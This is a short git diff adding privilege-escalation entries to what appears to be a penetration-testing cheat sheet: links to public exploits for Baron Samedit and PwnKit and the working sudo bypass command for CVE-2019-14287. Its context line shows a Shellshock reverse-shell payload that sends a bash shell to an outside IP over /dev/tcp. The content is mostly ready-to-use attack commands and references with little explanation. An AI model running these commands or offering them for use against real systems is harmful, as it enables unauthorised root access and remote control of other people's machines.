@@ -3886,6 +3886,24 @@ $ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1
 https://github.com/ohpe/juicy-potato
 ```
 
+- Baron Samedit - CVE-2021-3156
+
+```
+https://github.com/blasty/CVE-2021-3156
+```
+
+- Sudo Bypass - CVE-2019-14287
+
+```
+$ sudo -u#-1 id
+```
+
+- PwnKit - CVE-2021-4034
+
+```
+https://github.com/arthepsy/CVE-2021-4034
+```
+
 #15. - Exploit Research
 -----------------------------------------
 
